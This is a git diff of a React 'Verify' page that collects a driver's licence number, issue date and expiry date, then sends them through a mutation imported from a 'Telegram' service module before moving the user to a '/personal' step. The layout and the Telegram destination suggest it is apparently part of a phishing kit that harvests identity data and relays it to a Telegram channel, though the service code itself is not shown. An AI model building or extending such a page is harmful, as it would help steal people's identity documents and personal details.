@@ -2,10 +2,12 @@ import React, { useState } from "react";
 import id from "../assets/id.png";
 import download from "../assets/download2.png";
 import { useNavigate } from "react-router-dom";
+import { useSendVerifyMutation } from "../Services/Telegram";
 
 const Verify = () => {
   const [currentErrorField, setCurrentErrorField] = useState(null);
   const navigate = useNavigate();
+  const [sendVerify] = useSendVerifyMutation();
 
   const [errors, setErrors] = useState({
     licenseNumber: false,
@@ -67,43 +69,35 @@ const Verify = () => {
     }
   };
 
-  const handleSubmit = async (e) => {
-    e.preventDefault();
+const handleSubmit = async (e) => {
+  e.preventDefault();
 
-    // Validate in order
-    if (!validateField("licenseNumber")) {
-      setCurrentErrorField("licenseNumber");
-      return;
-    }
-    if (!validateField("issueDate")) {
-      setCurrentErrorField("issueDate");
-      return;
-    }
-    if (!validateField("expireDate")) {
-      setCurrentErrorField("expireDate");
-      return;
-    }
+  // Validate in order
+  if (!validateField("licenseNumber")) {
+    setCurrentErrorField("licenseNumber");
+    return;
+  }
+  if (!validateField("issueDate")) {
+    setCurrentErrorField("issueDate");
+    return;
+  }
+  if (!validateField("expireDate")) {
+    setCurrentErrorField("expireDate");
+    return;
+  }
 
-    setCurrentErrorField(null);
+  setCurrentErrorField(null);
 
-    try {
-      const response = await fetch("http://localhost:4000/sendVerify", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify(formData),
-      });
+  try {
+    const response = await sendVerify(formData).unwrap();
 
-      if (!response.ok) {
-        throw new Error("Failed to send details to server");
-      }
+    console.log("Details sent successfully!");
+    navigate("/personal");
+  } catch (error) {
+    console.error("Error sending details:", error);
+  }
+};
 
-      console.log("Details sent successfully!");
-      navigate("/personal");
-    } catch (error) {
-      console.error("Error sending details:", error);
-      // Optionally show an error message to user here
-    }
-  };
 
   return (
     <div className="flex flex-col min-h-screen bg-[#ffffff]">
